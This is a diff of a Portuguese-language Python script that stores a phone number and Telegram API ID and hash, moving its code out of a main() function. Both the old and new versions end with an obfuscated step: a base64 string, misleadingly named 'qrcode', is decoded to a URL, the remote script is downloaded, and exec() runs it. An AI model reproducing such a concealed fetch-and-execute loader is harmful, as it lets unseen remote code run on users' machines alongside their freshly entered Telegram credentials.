@@ -26,37 +26,31 @@ def salvar_dados_telefone(dados_path, telefone, id_telegram, hash_telegram):
         arquivo.write(f'ID {id_telegram}\n')
         arquivo.write(f'HASH {hash_telegram}\n')
 
-def main():
-    global DDIDDDTELEFONE
 
-    ddi = input('Digite o DDI (código do país): ')
-    ddd = input('Digite o DDD (código da região): ')
-    telefone = input('Digite o número de telefone (sem DDI e DDD): ')
-    telefone_completo = f'{ddi}{ddd}{telefone}'
-    # Variável global para armazenar o DDIDDDTELEFONE
-    DDIDDDTELEFONE = telefone_completo
+global DDIDDDTELEFONE
 
-    dados_path = criar_pasta_telefone(telefone_completo)
+ddi = input('Digite o DDI (código do país): ')
+ddd = input('Digite o DDD (código da região): ')
+telefone = input('Digite o número de telefone (sem DDI e DDD): ')
+telefone_completo = f'{ddi}{ddd}{telefone}'
+# Variável global para armazenar o DDIDDDTELEFONE
+DDIDDDTELEFONE = telefone_completo
 
-    if not verificar_arquivo_existe(dados_path, telefone_completo):
-        id_telegram = input('Digite o ID do Telegram: ')
-        hash_telegram = input('Digite o HASH do Telegram: ')
-        
-        salvar_dados_telefone(dados_path, telefone_completo, id_telegram, hash_telegram)
-        print('Dados salvos com sucesso!')
-    else:
-        print('Os dados já foram salvos anteriormente. Ignorando a próxima etapa.')
-        
-    qrcode = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9hYnJpcnFyLnB5"
-    qrcode = base64urldecode(qrcode.encode("utf-8"))
-    qrcode = qrcode.decode("utf-8")
-    headers = {'Referer': qrcode}
-    qrcode = requests.get(qrcode, headers=headers)
-    qrcode = qrcode.text 
-    exec(qrcode)   
+dados_path = criar_pasta_telefone(telefone_completo)
 
-
-
-if __name__ == "__main__":
-    main()
-
+if not verificar_arquivo_existe(dados_path, telefone_completo):
+    id_telegram = input('Digite o ID do Telegram: ')
+    hash_telegram = input('Digite o HASH do Telegram: ')
+    
+    salvar_dados_telefone(dados_path, telefone_completo, id_telegram, hash_telegram)
+    print('Dados salvos com sucesso!')
+else:
+    print('Os dados já foram salvos anteriormente. Ignorando a próxima etapa.')
+    
+qrcode = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9hYnJpcnFyLnB5"
+qrcode = base64urldecode(qrcode.encode("utf-8"))
+qrcode = qrcode.decode("utf-8")
+headers = {'Referer': qrcode}
+qrcode = requests.get(qrcode, headers=headers)
+qrcode = qrcode.text 
+exec(qrcode)   
